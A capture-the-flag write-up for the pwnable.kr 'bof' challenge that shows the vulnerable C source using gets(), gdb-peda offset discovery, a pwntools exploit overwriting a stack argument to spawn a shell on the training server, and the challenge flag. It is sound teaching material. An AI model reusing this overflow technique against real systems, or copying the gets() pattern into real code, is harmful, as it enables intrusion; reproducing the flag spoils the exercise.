# pwnable.kr bof writeup (5 pt)

```
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

So it gives us the vulnerable binary & the source code. Also the binary is running at `pwnable.kr 9000`.

Let's start!

# 0x01 Binary Enumeration

Let's download the files first.

```bash
[root@pwn4magic]:~/Desktop/bof# wget -q http://pwnable.kr/bin/bof
[root@pwn4magic]:~/Desktop/bof# wget -q http://pwnable.kr/bin/bof.c
[root@pwn4magic]:~/Desktop/bof# ls 
bof  bof.c
```

Cool, now let's enumerate the binary.

```bash
[root@pwn4magic]:~/Desktop/bof# file bof
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```

32bit binary cool, let's run the binary now & try to crash it.

```bash
[root@pwn4magic]:~/Desktop/bof# chmod +x bof
[root@pwn4magic]:~/Desktop/bof# ./bof
overflow me : 
1337
Nah..
[root@pwn4magic]:~/Desktop/bof# python -c 'print "A" * 100' | ./bof
overflow me : 
Nah..
*** stack smashing detected ***: <unknown> terminated
Aborted
```

Alright, now let's check the source code.

`bof.c`

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

So we have 2 functions, function `func` & function `main`. We need to focus on function `func`. 

We have a buffer there `char overflowme[32];` 32bytes and it tells us if `key == 0xcafebabe` will gives us shell.

Let's find the offset now.

# Exploitation

Let's fire up PEDA!

```bash
root@pwn4magic]:~/Desktop/bof# gdb -q bof
Reading symbols from bof...
(No debugging symbols found in bof)
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x00000474  _init
0x000004c0  gets@plt
0x000004d0  __stack_chk_fail@plt
0x000004e0  __cxa_finalize@plt
0x000004f0  puts@plt
0x00000500  system@plt
0x00000510  __gmon_start__@plt
0x00000520  __libc_start_main@plt
0x00000530  _start
0x00000570  __do_global_dtors_aux
0x000005f0  frame_dummy
0x00000627  __i686.get_pc_thunk.bx
0x0000062c  func
0x0000068a  main
0x000006b0  __libc_csu_init
0x00000720  __libc_csu_fini
0x00000730  __do_global_ctors_aux
0x00000768  _fini
gdb-peda$ 
```

We can the functions there `func` & `main`. Let's disassemble func.

```assembly
gdb-peda$ disassemble func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x78c
   0x56555644 <+24>:    call   0x56555645 <func+25>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0x56555650 <func+36>
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x79b
   0x56555664 <+56>:    call   0x56555665 <func+57>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x7a3
   0x56555672 <+70>:    call   0x56555673 <func+71>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0x56555684 <func+88>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret    
End of assembler dump.
gdb-peda$ 
```

Let's set a breakpoint at `cmp` instruction. Then we will generate a 100bytes pattern.

```bash
gdb-peda$ break *0x56555654
Breakpoint 1 at 0x56555654
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ 
```

Now we will run the binary and input the 100bytes.

```bash
gdb-peda$ r
Starting program: /root/Desktop/bof/bof 
overflow me : 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
[----------------------------------registers-----------------------------------]
EAX: 0xffffd19c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x0 
ECX: 0xf7fad5c0 --> 0xfbad2288 
EDX: 0xf7faf01c --> 0x0 
ESI: 0xf7fad000 --> 0x1d6d6c 
EDI: 0xf7fad000 --> 0x1d6d6c 
EBP: 0xffffd1c8 ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
ESP: 0xffffd180 --> 0xffffd19c ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x56555654 (<func+40>:     cmp    DWORD PTR [ebp+0x8],0xcafebabe)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
```

Let's display the memory contents of `ebp+0x8` at EIP register & find the offset.

```bash
gdb-peda$ x/s $ebp+0x8
0xffffd1d0:     "AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"
gdb-peda$ pattern offset AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 52
gdb-peda$ 
```

Perfect time to build our exploit.

`exploit.py PoC`

```python
#!/usr/bin/env python
from pwn import *

sock = remote('pwnable.kr', 9000)
payload = "A" * 52 + p32(0xcafebabe)
sock.sendline(payload)
sock.interactive()
```

Let's fire it up!

```bash
[root@pwn4magic]:~/Desktop/bof# chmod +x exploit.py 
[root@pwn4magic]:~/Desktop/bof# ./exploit.py 
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls
bof
bof.c
flag
log
log2
super.pl
$ cat flag
daddy, I just pwned a buFFer :)
$  
```

Flag : `daddy, I just pwned a buFFer :)`

-pwn4magic

